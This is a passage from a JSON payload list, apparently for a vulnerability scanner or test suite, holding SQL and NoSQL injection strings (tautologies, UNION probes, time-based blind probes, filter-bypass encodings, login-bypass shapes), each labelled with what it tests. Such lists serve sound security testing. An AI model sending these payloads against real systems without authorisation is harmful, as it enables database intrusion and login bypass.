 "sqli": [
  {
   "payload": "' OR '1'='1",
   "tests": "classic tautology, single-quote context",
   "kind": "sqli"
  },
  {
   "payload": "' OR '1'='1' -- ",
   "tests": "tautology with line comment",
   "kind": "sqli"
  },
  {
   "payload": "\" OR \"1\"=\"1",
   "tests": "double-quote context",
   "kind": "sqli"
  },
  {
   "payload": "' OR 1=1 -- ",
   "tests": "numeric-tolerant tautology",
   "kind": "sqli"
  },
  {
   "payload": "' UNION SELECT NULL-- ",
   "tests": "union probe, 1 column",
   "kind": "sqli"
  },
  {
   "payload": "' UNION SELECT NULL,NULL-- ",
   "tests": "union probe, 2 columns",
   "kind": "sqli"
  },
  {
   "payload": "' UNION SELECT NULL,NULL,NULL-- ",
   "tests": "union probe, 3 columns",
   "kind": "sqli"
  },
  {
   "payload": "' AND SLEEP(5)-- ",
   "tests": "time-based blind, MySQL",
   "kind": "sqli"
  },
  {
   "payload": "'; WAITFOR DELAY '0:0:5'-- ",
   "tests": "time-based blind, MSSQL stacked",
   "kind": "sqli"
  },
  {
   "payload": "' || (SELECT pg_sleep(5))-- ",
   "tests": "time-based blind, Postgres",
   "kind": "sqli"
  },
  {
   "payload": "1' AND '1'='1",
   "tests": "inline true condition (differential baseline)",
   "kind": "sqli"
  },
  {
   "payload": "1' AND '1'='2",
   "tests": "inline false condition (differential pair)",
   "kind": "sqli"
  },
  {
   "payload": "%27%20OR%20%271%27%3D%271",
   "tests": "URL-encoded tautology",
   "kind": "sqli"
  },
  {
   "payload": "'/**/OR/**/'1'='1",
   "tests": "inline-comment whitespace bypass",
   "kind": "sqli"
  },
  {
   "payload": "' OR 'a'='a'/*",
   "tests": "block-comment truncation",
   "kind": "sqli"
  },
  {
   "payload": "admin'-- ",
   "tests": "auth-bypass shape, comment",
   "kind": "sqli"
  },
  {
   "payload": "' OR SLEEP(5)#",
   "tests": "hash-comment time-based, MySQL",
   "kind": "sqli"
  },
  {
   "payload": "1;SELECT SLEEP(5)",
   "tests": "stacked query time-based",
   "kind": "sqli"
  },
  {
   "payload": "'\"",
   "tests": "quote-breaker probe (error differential)",
   "kind": "sqli"
  },
  {
   "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ",
   "tests": "error-based probe, MSSQL (detection only)",
   "kind": "sqli"
  },
  {
   "payload": "'||(SELECT SLEEP(2))||'",
   "tests": "second-order stored time shape (fires on reuse)",
   "kind": "sqli"
  },
  {
   "payload": "{\"$gt\": \"\"}",
   "tests": "NoSQL operator injection, MongoDB $gt",
   "kind": "sqli"
  },
  {
   "payload": "{\"username\": {\"$ne\": null}}",
   "tests": "NoSQL auth bypass shape, MongoDB $ne",
   "kind": "sqli"
  },
  {
   "payload": "' UNION SELECT NULL FROM DUAL-- ",
   "tests": "Oracle DUAL union probe (1 column)",
   "kind": "sqli"
  },
  {
   "payload": "'||CHAR(65,66,67)||'",
   "tests": "string-concat operator probe (SQLite/MySQL)",
   "kind": "sqli"
  },
  {
   "payload": "%2527%2520OR%25201%253D1",
